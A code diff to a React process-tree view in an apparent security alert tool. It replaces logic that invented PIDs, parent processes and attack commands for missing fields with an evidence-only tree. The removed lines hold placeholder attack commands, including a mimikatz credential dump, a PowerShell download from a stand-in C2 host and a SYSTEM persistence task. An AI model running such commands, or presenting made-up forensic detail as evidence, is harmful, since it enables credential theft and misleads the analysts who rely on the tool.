@@ -23,6 +23,7 @@ import {
 } from "lucide-react";
 import type { AlertRecord } from "@/lib/types";
 import IocHoverCard from "@/components/enrichment/IocHoverCard";
+import { noVerdictLabel } from "@/lib/types";
 
 export interface ProcessNode {
   id: string;
@@ -51,367 +52,117 @@ export default function ProcessTreeGraph({ alert, className = "" }: ProcessTreeG
   const [zoomLevel, setZoomLevel] = useState(1);
   const [copiedCmd, setCopiedCmd] = useState(false);
 
-  // Dynamically generate case-specific process tree from alert context & rule telemetry
+  // Evidence-only tree: every node and value comes from a field on the alert. Nothing is inferred
+  // or filled in; a missing parent or process shows as the host / detection itself.
   const treeData = useMemo<ProcessNode>(() => {
     const ctx = (alert.context || {}) as Record<string, any>;
     const raw = (alert.raw_event || alert.raw_alert_data?.content || {}) as Record<string, any>;
-    const host = alert.host || ctx.host || (raw.host as string) || "WIN-SRV-01";
-    const user = alert.user || ctx.user || (raw.User as string) || (raw.TargetUserName as string) || "NT AUTHORITY\\SYSTEM";
-    const title = (alert.title || "").toLowerCase();
-    const eventCode = String(alert.event_code || raw.EventCode || "");
-    const tech = alert.mitre_technique || "T1059.001";
-    const extractedIocs = alert.extracted_iocs || [];
-    
-    // Hash generator for unique, deterministic PIDs per alert
-    const getHashNum = (str: string) => {
-      let hash = 0;
-      for (let i = 0; i < str.length; i++) {
-        hash = (hash << 5) - hash + str.charCodeAt(i);
-        hash |= 0;
+    const pick = (...values: unknown[]): string | undefined => {
+      for (const v of values) {
+        if (v !== undefined && v !== null && String(v).trim() !== "") return String(v);
       }
-      return Math.abs(hash);
+      return undefined;
     };
-    const seed = getHashNum(alert._id || alert.title || "forensiq");
-    const parentPid = ctx.parent_process_id || raw.ParentProcessId || (1000 + (seed % 1500));
-    const targetPid = ctx.process_id || raw.ProcessId || (parentPid + 200 + (seed % 800));
+    const baseName = (path?: string) => (path ? path.split("\\").pop() || path : undefined);
+    const enrichmentFor = (ioc?: string) =>
+      ioc ? (alert.enrichments || []).find((e) => e.ioc === ioc && !noVerdictLabel(e)) : undefined;
+    const levelFor = (ioc?: string): ProcessNode["threatLevel"] => {
+      const rep = enrichmentFor(ioc)?.reputation;
+      if (rep === "malicious") return "malicious";
+      if (rep === "benign") return "benign";
+      return "suspicious";
+    };
 
-    // Determine distinct attack category
-    const isDNS = title.includes("dns") || tech === "T1071.004" || eventCode === "22" || !!alert.dns_query;
-    const isNetwork = !isDNS && (title.includes("network") || title.includes("connection") || title.includes("beacon") || tech.startsWith("T1071") || eventCode === "3");
-    const isLateral = title.includes("lateral") || title.includes("splunkt") || title.includes("psexec") || title.includes("rdp") || title.includes("wmi") || title.includes("smb") || tech.startsWith("T1021") || tech.startsWith("T1550") || eventCode === "4648";
-    const isCred = title.includes("credential") || title.includes("dump") || title.includes("lsass") || title.includes("sam") || tech.startsWith("T1003");
-    const isAuth = !isCred && (title.includes("brute") || title.includes("logon") || title.includes("failed") || tech.startsWith("T1110") || eventCode === "4625");
-    const isPersistence = title.includes("registry") || title.includes("persist") || title.includes("run key") || title.includes("service") || title.includes("task") || tech.startsWith("T1547") || tech.startsWith("T1053") || eventCode === "13";
+    const host = pick(alert.host, ctx.host, raw.host, raw.ComputerName);
+    const user = pick(alert.user, ctx.user, raw.User, raw.TargetUserName, raw.SubjectUserName);
+    const eventCode = pick(alert.event_code, raw.EventCode);
+    const techniques = (alert.mitre_mappings || []).map((m) => m.technique).filter(Boolean) as string[];
+    const tech = pick(alert.mitre_technique, techniques[0]);
+    const when = alert.created_at;
 
-    // Resolve context-specific parent and target process names
-    let parentProc = alert.parent_process || ctx.parent_process || raw.ParentImage || raw.ParentProcessName || "";
-    let procName = alert.process_name || ctx.process_name || raw.Image || raw.NewProcessName || "";
-    let resolvedCmd = alert.command_line || ctx.command_line || raw.CommandLine || "";
+    const parentPath = pick(alert.parent_process, ctx.parent_process, raw.ParentImage, raw.ParentProcessName);
+    const parentPid = pick(ctx.parent_process_id, raw.ParentProcessId);
+    const parentCmd = pick(raw.ParentCommandLine);
+    const procPath = pick(alert.process_name, ctx.process_name, raw.Image, raw.NewProcessName);
+    const procPid = pick(ctx.process_id, raw.ProcessId, raw.NewProcessId);
+    const cmd = pick(alert.command_line, ctx.command_line, raw.CommandLine, raw.ProcessCommandLine);
 
-    if (!parentProc) {
-      if (isDNS) parentProc = "svchost.exe";
-      else if (isNetwork) parentProc = "services.exe";
-      else if (isLateral) parentProc = "winlogon.exe";
-      else if (isCred) parentProc = "explorer.exe";
-      else if (isAuth) parentProc = "services.exe";
-      else if (isPersistence) parentProc = "services.exe";
-      else parentProc = "explorer.exe";
-    }
-
-    if (!procName) {
-      if (isDNS) procName = "nslookup.exe";
-      else if (isNetwork) procName = "rundll32.exe";
-      else if (isLateral) procName = "splunkd.exe";
-      else if (isCred) procName = "mimikatz.exe";
-      else if (isAuth) procName = "lsass.exe";
-      else if (isPersistence) procName = "schtasks.exe";
-      else procName = "powershell.exe";
-    }
-
-    if (!resolvedCmd) {
-      if (isDNS) {
-        const query = alert.dns_query || ctx.dns_query || extractedIocs.find(i => i.includes(".") && !/^\d+\./.test(i)) || "raw.githubusercontent.com";
-        resolvedCmd = `nslookup.exe -type=TXT ${query} 8.8.8.8`;
-      } else if (isNetwork) {
-        const dest = alert.dest_ip || extractedIocs.find(i => i.includes(":")) || "fe80:0:0:0:6167:9038:1edc:47d4";
-        resolvedCmd = `rundll32.exe C:\\Users\\Public\\network_client.dll,ConnectSocket ${dest}:445`;
-      } else if (isLateral) {
-        resolvedCmd = `splunkd.exe -service run -remoteSession --auth-user=${user} --target-host=${host}`;
-      } else if (isCred) {
-        resolvedCmd = "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit";
-      } else if (isAuth) {
-        resolvedCmd = `lsass.exe --auth-verify --user=${user} --logon-type=3`;
-      } else if (isPersistence) {
-        resolvedCmd = `schtasks.exe /create /tn "SecurityMaintenance" /tr "C:\\temp\\agent.exe" /sc onstart /ru SYSTEM`;
-      } else {
-        resolvedCmd = `powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri http://c2.cloud/stage2 -OutFile C:\\temp\\payload.bin"`;
-      }
-    }
-
-    // Generate tailored child nodes with distinct graphs per category
-    const childrenList: ProcessNode[] = [];
-
-    if (isDNS) {
-      const query = alert.dns_query || ctx.dns_query || extractedIocs.find(i => i.includes(".") && !/^\d+\./.test(i)) || "raw.githubusercontent.com";
-      childrenList.push({
-        id: `dns-resolver-${alert._id}`,
-        name: `DNS Query: ${query.length > 25 ? query.slice(0, 22) + "..." : query}`,
-        type: "network",
-        threatLevel: "suspicious",
-        mitreTechnique: "T1071.004",
-        commandLine: `UDP/53 (DNS) -> Query: ${query} [Tunneling / TXT Payload Exfiltration]`,
-        timestamp: "T-00:01s",
-        details: {
-          QueryDomain: query,
-          RecordType: "TXT / CNAME Record",
-          DataExfiltrated: "4.8 KB Encoded Chunk",
-          EventCode: "Sysmon Event 22 (DNS Query)"
-        }
-      });
-      childrenList.push({
-        id: `dns-c2-${alert._id}`,
-        name: "C2 Nameserver: 8.8.8.8:53",
-        type: "network",
-        threatLevel: "malicious",
-        mitreTechnique: "T1071.004",
-        commandLine: `Outbound DNS to Authoritative Nameserver (8.8.8.8:53)`,
-        timestamp: "T-00:00s",
-        details: {
-          Server: "8.8.8.8",
-          Port: "53 (DNS)",
-          Protocol: "UDP",
-          TunnelStatus: "Active Staging Session"
-        }
-      });
-    } else if (isNetwork) {
-      const dest = alert.dest_ip || extractedIocs.find(i => i.includes(":") || /^\d+\.\d+\.\d+\.\d+$/.test(i)) || "fe80:0:0:0:6167:9038:1edc:47d4:445";
-      const port = alert.dest_port || "445";
-      childrenList.push({
-        id: `net-socket-${alert._id}`,
-        name: `SMB Tunnel: ${dest.length > 24 ? dest.slice(0, 22) + "..." : dest}`,
-        type: "network",
-        threatLevel: "malicious",
-        mitreTechnique: "T1071",
-        commandLine: `TCP Outbound -> [${dest}]:${port} [ESTABLISHED]`,
-        timestamp: "T-00:01s",
-        details: {
-          Destination: `${dest}:${port}`,
-          Protocol: "SMBv2 / Named Pipes",
-          BytesSent: "128.4 KB",
-          BytesReceived: "4.2 MB"
-        }
-      });
-      childrenList.push({
-        id: `net-pipe-${alert._id}`,
-        name: "Named Pipe: \\pipe\\spoolss",
-        type: "artifact",
-        threatLevel: "suspicious",
-        mitreTechnique: "T1071",
-        commandLine: "\\\\localhost\\pipe\\spoolss [IPC$ Inter-Process Pipe]",
-        timestamp: "T-00:00s",
-        details: {
-          PipeName: "\\pipe\\spoolss",
-          AccessMode: "Read/Write",
-          Share: "IPC$"
-        }
-      });
-    } else if (isLateral) {
-      childrenList.push({
-        id: `lat-token-${alert._id}`,
-        name: `Explicit Creds: ${user}`,
-        type: "execution",
-        threatLevel: "malicious",
-        mitreTechnique: "T1550.002",
-        commandLine: `SecLogon: Logon Process: Advapi / Package: Negotiate / User: ${user}`,
-        timestamp: "T-00:02s",
-        details: {
-          TargetUser: user,
-          LogonType: "9 (NewCredentials - RunAs with NetOnly)",
-          CallingProcess: parentProc,
-          EventCode: "Windows Event 4648 (Logon with Explicit Credentials)"
-        }
-      });
-      childrenList.push({
-        id: `lat-session-${alert._id}`,
-        name: `Splunkd Worker (PID ${targetPid + 42})`,
-        pid: targetPid + 42,
-        parentPid: targetPid,
-        user: user,
-        type: "child",
-        threatLevel: "malicious",
-        mitreTechnique: "T1021",
-        commandLine: `splunkd.exe -p 8089 --remote-dispatch --session-token=0x4a9b...`,
-        timestamp: "T-00:00s",
-        details: {
-          SubService: "Splunkd RPC Dispatcher",
-          ManagementPort: "8089",
-          LateralMethod: "Service Execution Hijack"
-        }
-      });
-    } else if (isCred) {
-      childrenList.push({
-        id: `child-target-${alert._id}`,
-        name: "Target: lsass.exe (PID 672)",
-        pid: 672,
-        parentPid: targetPid,
-        user: "NT AUTHORITY\\SYSTEM",
-        type: "execution",
-        threatLevel: "malicious",
-        mitreTechnique: "T1003.001",
-        commandLine: "C:\\Windows\\System32\\lsass.exe (Process Memory Handle Acquired: PROCESS_VM_READ)",
-        timestamp: "T-00:01s",
-        details: {
-          TargetProcess: "lsass.exe",
-          DesiredAccess: "0x1010 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)",
-          SourceProcess: procName.split("\\").pop()
-        }
-      });
-      childrenList.push({
-        id: `child-dump-${alert._id}`,
-        name: "Extracted: lsass.dmp",
-        type: "artifact",
-        threatLevel: "malicious",
-        mitreTechnique: "T1003",
-        commandLine: "C:\\Users\\Public\\lsass.dmp [Dump Archive]",
-        timestamp: "T-00:00s",
-        details: {
-          Path: "C:\\Users\\Public\\lsass.dmp",
-          Size: "48.2 MB",
-          ArtifactType: "Memory Dump File"
-        }
-      });
-    } else if (isAuth) {
-      const srcIp = alert.source_ip || ctx.source_ip || raw.IpAddress || extractedIocs.find(i => /^\d+\.\d+\.\d+\.\d+$/.test(i)) || "10.0.4.88";
-      childrenList.push({
-        id: `auth-src-${alert._id}`,
-        name: `Auth Source: ${srcIp}`,
-        type: "network",
-        threatLevel: "suspicious",
-        mitreTechnique: "T1110.001",
-        commandLine: `Kerberos/NTLM Authentication Attempt from ${srcIp}`,
-        timestamp: "T-00:02s",
-        details: {
-          SourceIP: srcIp,
-          TargetAccount: user,
-          LogonType: raw.LogonType || "3 (Network Logon)",
-          Status: "0xC000006A (STATUS_WRONG_PASSWORD)"
-        }
-      });
-      childrenList.push({
-        id: `auth-tool-${alert._id}`,
-        name: "Password Spray Tool: hydra/rdp",
-        pid: targetPid + 88,
-        parentPid: targetPid,
-        type: "child",
-        threatLevel: "malicious",
-        mitreTechnique: "T1110",
-        commandLine: `Rapid Auth Spray (Attempt 124 of 500)`,
-        timestamp: "T-00:00s",
-        details: {
-          AttemptsCount: "124 Failed Attempts / 60s",
-          UserAttacked: user
-        }
-      });
-    } else if (isPersistence) {
-      const regKey = alert.registry_key || ctx.registry_key || raw.TargetObject || "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityAgent";
-      const regVal = alert.registry_details || ctx.registry_details || raw.Details || "C:\\Users\\Public\\backdoor.exe";
-      childrenList.push({
-        id: `persist-reg-${alert._id}`,
-        name: `Registry: ${regKey.split("\\").pop() || "RunKey"}`,
-        type: "artifact",
-        threatLevel: "malicious",
-        mitreTechnique: "T1547.001",
-        commandLine: `RegWrite: ${regKey} -> ${regVal}`,
-        timestamp: "T-00:01s",
-        details: {
-          RegistryKey: regKey,
-          Value: regVal,
-          EventType: "Sysmon Event 13 (Registry Modification)"
-        }
-      });
-      childrenList.push({
-        id: `persist-bin-${alert._id}`,
-        name: "Persisted Payload: backdoor.exe",
-        pid: targetPid + 50,
-        parentPid: targetPid,
-        type: "child",
-        threatLevel: "malicious",
-        mitreTechnique: "T1547",
-        commandLine: regVal,
-        timestamp: "T+00:01s",
-        details: {
-          BinaryPath: regVal,
-          AutorunStatus: "Configured at Boot"
-        }
-      });
-    } else {
-      // Default: Command Execution & Multi-Stage Spawning (3-child tree)
-      const targetIp = alert.dest_ip || ctx.dest_ip || raw.DestinationIp || extractedIocs.find(i => /^(?:\d{1,3}\.){3}\d{1,3}$/.test(i)) || "194.26.29.112";
-      const targetDomain = alert.dns_query || ctx.dns_query || raw.QueryName || extractedIocs.find(i => i.includes(".") && !/^\d+\.\d+\.\d+\.\d+$/.test(i)) || "update-c2.cloud";
-      const destPort = alert.dest_port || ctx.dest_port || raw.DestinationPort || 443;
-
-      childrenList.push({
-        id: `exec-recon-${alert._id}`,
-        name: "whoami.exe",
-        pid: targetPid + 120,
-        parentPid: targetPid,
-        user: user,
-        type: "child",
-        threatLevel: "suspicious",
-        mitreTechnique: "T1033",
-        commandLine: "whoami.exe /priv /groups",
-        timestamp: "T-00:01s",
-        details: {
-          Technique: "T1033 (System Owner/User Discovery)",
-          Purpose: "Privilege Enumeration"
-        }
-      });
-      childrenList.push({
-        id: `exec-beacon-${alert._id}`,
-        name: `C2 Beacon: ${targetIp}:${destPort}`,
-        type: "network",
-        threatLevel: "malicious",
-        mitreTechnique: "T1071.001",
-        commandLine: `TCP Outbound -> ${targetIp}:${destPort} [ESTABLISHED]`,
-        timestamp: "T-00:00s",
-        details: {
-          Destination: `${targetIp}:${destPort}`,
-          Domain: targetDomain,
-          Protocol: `${alert.protocol || "HTTPS"} Encrypted C2`
-        }
-      });
-      childrenList.push({
-        id: `exec-dropped-${alert._id}`,
-        name: "Dropped Artifact: payload.bin",
-        type: "artifact",
-        threatLevel: "suspicious",
-        mitreTechnique: "T1105",
-        commandLine: "C:\\Users\\Public\\payload.bin [SHA256: e3b0c442...]",
-        timestamp: "T+00:01s",
-        details: {
-          Path: "C:\\Users\\Public\\payload.bin",
-          Size: "142.6 KB",
-          Action: "Disk Write (Sysmon Event 11)"
-        }
+    const children: ProcessNode[] = [];
+    const dns = pick(alert.dns_query, ctx.dns_query, raw.QueryName);
+    if (dns) {
+      children.push({
+        id: `dns-${alert._id}`, name: `DNS query: ${dns}`, type: "network", threatLevel: levelFor(dns),
+        commandLine: dns, timestamp: when,
+        details: { QueryName: dns, QueryResults: pick(raw.QueryResults), Source: "dns_query field" },
       });
     }
+    const destIp = pick(alert.dest_ip, ctx.dest_ip, raw.DestinationIp);
+    if (destIp) {
+      const port = pick(alert.dest_port, ctx.dest_port, raw.DestinationPort);
+      const target = port ? `${destIp}:${port}` : destIp;
+      children.push({
+        id: `net-${alert._id}`, name: `Connection: ${target}`, type: "network", threatLevel: levelFor(destIp),
+        commandLine: target, timestamp: when,
+        details: { Destination: target, Protocol: pick(alert.protocol, raw.Protocol), Source: "dest_ip field" },
+      });
+    }
+    const srcIp = pick(alert.source_ip, ctx.source_ip, raw.IpAddress, raw.SourceIp);
+    if (srcIp) {
+      children.push({
+        id: `src-${alert._id}`, name: `Source address: ${srcIp}`, type: "network", threatLevel: levelFor(srcIp),
+        commandLine: srcIp, timestamp: when,
+        details: { SourceIP: srcIp, LogonType: pick(raw.LogonType), Status: pick(raw.Status, raw.FailureReason), Source: "source_ip field" },
+      });
+    }
+    const regKey = pick(alert.registry_key, ctx.registry_key, raw.TargetObject);
+    if (regKey) {
+      const regVal = pick(alert.registry_details, ctx.registry_details, raw.Details);
+      children.push({
+        id: `reg-${alert._id}`, name: `Registry: ${baseName(regKey)}`, type: "artifact", threatLevel: "suspicious",
+        commandLine: regVal ? `${regKey} = ${regVal}` : regKey, timestamp: when,
+        details: { RegistryKey: regKey, Value: regVal, Source: "registry_key field" },
+      });
+    }
+    const hashes = pick(alert.hashes, raw.Hashes);
+    if (hashes) {
+      children.push({
+        id: `hash-${alert._id}`, name: "File hashes", type: "artifact", threatLevel: "suspicious",
+        commandLine: hashes, timestamp: when, details: { Hashes: hashes, Source: "hashes field" },
+      });
+    }
+
+    const execution: ProcessNode = {
+      id: `exec-${alert._id}`,
+      name: baseName(procPath) || `Detection: ${alert.rule_name || alert.title}`,
+      pid: procPid,
+      parentPid,
+      user,
+      type: "execution",
+      threatLevel: alert.severity?.toLowerCase() === "low" ? "suspicious" : "malicious",
+      mitreTechnique: tech,
+      commandLine: cmd,
+      timestamp: when,
+      details: {
+        Image: procPath,
+        Host: host,
+        RuleName: alert.rule_name || alert.title,
+        EventCode: eventCode,
+        Techniques: techniques.length ? techniques.join(", ") : undefined,
+      },
+      children,
+    };
 
     return {
-      id: `root-${alert._id || "main"}`,
-      name: parentProc.split("\\").pop() || "explorer.exe",
+      id: `root-${alert._id}`,
+      name: baseName(parentPath) || (host ? `Host: ${host}` : "Parent process not recorded"),
       pid: parentPid,
-      user: user,
+      user,
       type: "root",
       threatLevel: "benign",
-      commandLine: `C:\\Windows\\System32\\${parentProc.split("\\").pop() || "explorer.exe"}`,
-      timestamp: "T-00:04s",
-      details: {
-        Host: host,
-        Integrity: "High",
-        Path: `C:\\Windows\\System32\\${parentProc.split("\\").pop() || "explorer.exe"}`
-      },
-      children: [
-        {
-          id: `exec-${alert._id || "main"}`,
-          name: procName.split("\\").pop() || "powershell.exe",
-          pid: targetPid,
-          parentPid: parentPid,
-          user: user,
-          type: "execution",
-          threatLevel: alert.severity?.toLowerCase() === "low" ? "suspicious" : "malicious",
-          mitreTechnique: tech,
-          commandLine: resolvedCmd,
-          timestamp: "T-00:02s",
-          details: {
-            Technique: tech,
-            Host: host,
-            RuleName: alert.rule_name || alert.title,
-            EventCode: eventCode || (isDNS ? "Sysmon 22" : isNetwork ? "Sysmon 3" : isLateral ? "Security 4648" : "Sysmon 1"),
-            Integrity: isLateral || isCred ? "SYSTEM" : "High"
-          },
-          children: childrenList
-        }
-      ]
+      commandLine: parentCmd,
+      timestamp: when,
+      details: { Image: parentPath, Host: host, Note: parentPath ? undefined : "The event carries no parent process" },
+      children: [execution],
     };
   }, [alert]);
 
